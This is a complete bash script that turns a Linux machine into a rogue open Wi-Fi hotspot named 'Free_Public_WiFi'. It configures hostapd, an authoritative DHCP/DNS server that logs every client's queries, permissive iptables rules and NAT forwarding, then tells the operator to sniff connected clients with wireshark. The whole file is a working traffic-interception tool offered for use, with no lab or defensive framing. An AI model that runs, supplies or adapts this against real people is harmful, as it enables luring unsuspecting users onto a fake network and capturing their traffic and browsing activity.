#!/bin/bash

# === CONFIGURATION ===
FAKE_SSID="Free_Public_WiFi"
CHANNEL="6"
INTERNET_IFACE="enx00e04c480aba"   # uplink with internet (ip route | grep default)
AP_IFACE="wlp2s0"                  # wireless card used as AP
DNSMASQ_CONF="/tmp/dnsmasq.conf"
HOSTAPD_CONF="/tmp/hostapd.conf"
IP_RANGE_START="10.0.0.10"
IP_RANGE_END="10.0.0.50"
GATEWAY_IP="10.0.0.1"
NETMASK="255.255.255.0"

if [ "$EUID" -ne 0 ]; then echo "[!] Run as root."; exit 1; fi

# === PREP ===
echo "[*] Preparing $AP_IFACE..."
rfkill unblock wifi 2>/dev/null
ip link delete at0 2>/dev/null
for vif in $(iw dev 2>/dev/null | awk '/Interface/ {print $2}'); do
  ip link set "$vif" down 2>/dev/null
  iw dev "$vif" del 2>/dev/null
done

PHY=$(iw phy 2>/dev/null | awk '/^Wiphy/ {print $2; exit}')
if [ -z "$PHY" ]; then echo "[!] No wireless phy found"; exit 1; fi

iw phy "$PHY" interface add "$AP_IFACE" type managed || { echo "[!] Failed to create $AP_IFACE on $PHY"; exit 1; }
nmcli device set "$AP_IFACE" managed no 2>/dev/null
ip link set "$AP_IFACE" up
ip addr flush dev "$AP_IFACE"
ip addr add "$GATEWAY_IP/24" dev "$AP_IFACE"

# === HOSTAPD CONFIG ===
echo "[*] Writing hostapd configuration..."
cat <<EOF > "$HOSTAPD_CONF"
interface=$AP_IFACE
driver=nl80211
ssid=$FAKE_SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
wmm_enabled=1
ignore_broadcast_ssid=0
EOF

echo "[*] Starting hostapd..."
hostapd "$HOSTAPD_CONF" > /tmp/hostapd.log 2>&1 &
HOSTAPD_PID=$!

for i in $(seq 1 10); do
  sleep 1
  if ! kill -0 "$HOSTAPD_PID" 2>/dev/null; then
    echo "[!] hostapd exited early. Log:"
    tail -30 /tmp/hostapd.log
    exit 1
  fi
  grep -q "AP-ENABLED" /tmp/hostapd.log && break
done
grep -q "AP-ENABLED" /tmp/hostapd.log || { echo "[!] hostapd did not enable AP. Log:"; tail -30 /tmp/hostapd.log; kill "$HOSTAPD_PID"; exit 1; }

# === DHCP/DNS CONFIG ===
echo "[*] Writing dnsmasq configuration..."
cat <<EOF > "$DNSMASQ_CONF"
interface=$AP_IFACE
bind-dynamic
except-interface=lo
listen-address=$GATEWAY_IP
dhcp-authoritative
dhcp-range=$IP_RANGE_START,$IP_RANGE_END,$NETMASK,12h
dhcp-option=3,$GATEWAY_IP
dhcp-option=6,$GATEWAY_IP
server=1.1.1.1
server=8.8.8.8
no-resolv
log-queries
log-dhcp
EOF

echo "[*] Starting dnsmasq..."
killall dnsmasq 2>/dev/null
sleep 1
dnsmasq -C "$DNSMASQ_CONF" || { echo "[!] dnsmasq failed to start"; kill "$HOSTAPD_PID"; exit 1; }

# === NAT + FORWARDING ===
echo "[*] Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[*] Setting iptables rules..."
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

iptables -I INPUT 1 -i "$AP_IFACE" -j ACCEPT
iptables -I OUTPUT 1 -o "$AP_IFACE" -j ACCEPT
iptables -t nat -A POSTROUTING -o "$INTERNET_IFACE" -j MASQUERADE
iptables -I FORWARD 1 -i "$AP_IFACE" -o "$INTERNET_IFACE" -j ACCEPT
iptables -I FORWARD 2 -i "$INTERNET_IFACE" -o "$AP_IFACE" -m state --state ESTABLISHED,RELATED -j ACCEPT

echo "[*] AP '$FAKE_SSID' running on $AP_IFACE. Sniff with: wireshark -i $AP_IFACE"
echo "[*] DNS/DHCP log: journalctl -t dnsmasq -f"

# === CLEANUP TRAP ===
cleanup() {
  echo "[*] Cleaning up..."
  kill "$HOSTAPD_PID" 2>/dev/null
  killall hostapd dnsmasq 2>/dev/null
  iptables --flush
  iptables -t nat --flush
  echo 0 > /proc/sys/net/ipv4/ip_forward
  ip addr flush dev "$AP_IFACE" 2>/dev/null
  ip link set "$AP_IFACE" down 2>/dev/null
  iw dev "$AP_IFACE" del 2>/dev/null
  iw phy "$PHY" interface add "$AP_IFACE" type managed 2>/dev/null
  nmcli device set "$AP_IFACE" managed yes 2>/dev/null
  exit
}
trap cleanup INT TERM

# === KEEP SCRIPT ALIVE ===
while kill -0 "$HOSTAPD_PID" 2>/dev/null; do sleep 2; done
echo "[!] hostapd died. Log:"
tail -30 /tmp/hostapd.log
cleanup
